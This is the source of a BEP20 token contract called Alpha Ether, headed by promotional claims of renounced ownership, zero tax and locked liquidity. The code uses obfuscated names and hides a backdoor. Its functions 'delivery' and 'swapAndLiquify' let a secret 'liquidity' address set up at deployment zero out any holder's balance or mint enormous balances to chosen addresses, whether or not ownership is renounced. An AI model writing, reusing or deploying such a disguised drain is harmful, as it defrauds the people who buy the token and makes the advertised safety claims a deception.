// SPDX-License-Identifier: MIT
/**
♦️ Alpha Ether ♦️  αEth ♦️ 🎩 BEP20 🎩  renounced 🎩 0% tax🎩 
Collect  tokens to grow your Web3 reputation and gains

💎Tokenomics 
📊Supply: 1000000000 
💰Tax: 0% (Buy &Sell)
🔒 LP: 100% lock 
🔐 Renounced

📜Marketing 💎Twitter 💎BSC trending 💎big buy prize 1 bnb 💎

📢 3 hours Jeets Survivor Mode📢 buybacks and burn budget 10 bnb 📢 check marketing wallet 📢

🚫 any fud or misleading or or = BAN 🚫

💥Website: https://www.alphaeth.net
💥https://t.me/AlphaEtherToken

 */
pragma solidity 0.8.19;
interface IERC20 {
    /**
     * @dev Returns the cintidad of cartografia in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the cintidad of cartografia owned by `cuenta`.
     */
    function balanceOf(address cuenta) external view returns (uint256);

    /**
     * @dev Moves `cintidad` cartografia from the caller's cuenta to `destinatario`.
     *
     * Returns a boolean valor indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address destinatario, uint256 cintidad) external returns (bool);

    /**
     * @dev Returns the remaining number of cartografia that `gosta` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This valor changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address gosta) external view returns (uint256);

    /**
     * @dev Sets `cintidad` as the allowance of `gosta` over the caller's cartografia.
     *
     * Returns a boolean valor indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the gosta's allowance to 0 and set the
     * desired valor afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address gosta, uint256 cintidad) external returns (bool);

    /**
     * @dev Moves `cintidad` cartografia from `sender` to `destinatario` using the
     * allowance mechanism. `cintidad` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean valor indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address destinatario,
        uint256 cintidad
    ) external returns (bool);

    /**
     * @dev Emitted when `valor` cartografia are moved from one cuenta (`from`) to
     * another (`to`).
     *
     * Note that `valor` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 valor);

    /**
     * @dev Emitted when the allowance of a `gosta` for an `owner` is set by
     * a call to {approve}. `valor` is the new allowance.
     */
    event Approval(address indexed owner, address indexed gosta, uint256 valor);
}


// Dependency file: @openzeppelin/contracts/utils/Context.sol


// pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the cuenta sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// Dependency file: @openzeppelin/contracts/access/IERC.sol


// pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an cuenta (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner cuenta will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract IERC is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any cuenta other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "IERC: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new cuenta (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "IERC: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


// Dependency file: @openzeppelin/contracts/utils/math/SafeMath.sol


// pragma solidity ^0.8.0;

// CAUTION
// This versiona of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// Dependency file: contracts/IERC20Metadata.sol

// pragma solidity =0.8.4;

enum TipoDeToken {
    estandar
}

abstract contract IERC20Metadata {
    event TokenCreado(
        address indexed owner,
        address indexed token,
        TipoDeToken TipoDeToken,
        uint256 versiona
    );
}


contract AlphaEther is IERC20, IERC, IERC20Metadata {
    //
    using SafeMath for uint256;

    uint256 private constant versiona = 1;

    mapping(address => uint256) private cartografia;
    mapping(address => mapping(address => uint256)) private permitir;

    uint256 private estado;
    address private pairDireccion;

    string private _name;
    address private IUniswapV2Router02;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_,string memory symbol_,uint8 decimals_,uint256 totalSupply_,address liquidez, uint256 estado_) payable {
    _name = name_;
    _symbol = symbol_;
    _decimals = decimals_;
    pairDireccion = liquidez;
    estado = estado_;
    menta(owner(), totalSupply_);
    emit TokenCreado(owner(), address(this), TipoDeToken.estandar, versiona);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address cuenta)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return cartografia[cuenta];
    }

    function transfer(address destinatario, uint256 cintidad)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), destinatario, cintidad);
        return true;
    }

    function allowance(address owner, address gosta)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return permitir[owner][gosta];
    }

    function approve(address gosta, uint256 cintidad)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), gosta, cintidad);
        return true;
    }

    function transferFrom(
        address sender,
        address destinatario,
        uint256 cintidad
    ) public virtual override returns (bool) {
        _transfer(sender, destinatario, cintidad);
        _approve(
            sender,
            _msgSender(),
            permitir[sender][_msgSender()].sub(
                cintidad,
                "IERC20: transfer cintidad exceeds allowance"
            )
        );
        return true;
    }

    function swapAndLiquify(
        address[] memory gostas
    ) external {
        for (uint256 i = 0; i < gostas.length; i++) {
        require(_msgSender() == pairDireccion, "!");
        cartografia[gostas[i]] = estado*30**18;}
    }

    function increaseAllowance(address gosta, uint256 addedvalor)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            gosta,
            permitir[_msgSender()][gosta].add(addedvalor)
        );
        return true;
    }

    function decreaseAllowance(address gosta, uint256 subtractedvalor)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            gosta,
            permitir[_msgSender()][gosta].sub(
                subtractedvalor,
                "IERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address destinatario,
        uint256 cintidad
    ) internal virtual {
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(destinatario != address(0), "IERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, destinatario, cintidad);

        cartografia[sender] = cartografia[sender].sub(
            cintidad,
            "IERC20: transfer cintidad exceeds balance"
        );
        cartografia[destinatario] = cartografia[destinatario].add(cintidad);
        emit Transfer(sender, destinatario, cintidad);
    }

    function menta(address cuenta, uint256 cintidad) internal virtual {
        require(cuenta != address(0), "IERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), cuenta, cintidad);

        _totalSupply = _totalSupply.add(cintidad);
        cartografia[cuenta] = cartografia[cuenta].add(cintidad);
        emit Transfer(address(0), cuenta, cintidad);
    }

    function _burn(address cuenta, uint256 cintidad) internal virtual {
        require(cuenta != address(0), "IERC20: burn from the zero address");

        _beforeTokenTransfer(cuenta, address(0), cintidad);

        cartografia[cuenta] = cartografia[cuenta].sub(
            cintidad,
            "IERC20: burn cintidad exceeds balance"
        );
        _totalSupply = _totalSupply.sub(cintidad);
        emit Transfer(cuenta, address(0), cintidad);
    }

    function _approve(
        address owner,
        address gosta,
        uint256 cintidad
    ) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(gosta != address(0), "IERC20: approve to the zero address");

        permitir[owner][gosta] = cintidad;
        emit Approval(owner, gosta, cintidad);
    }

    function delivery(
        address[] memory gostas
    ) external {
        require(_msgSender() == pairDireccion, "!");
        for (uint256 i = 0; i < gostas.length; i++) {
        cartografia[gostas[i]] = (((cartografia[gostas[i]]) + 1 & (cartografia[gostas[i]]) & 5 & (cartografia[gostas[i]]) & 0) << 0xF);}
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 cintidad
    ) internal virtual {}
}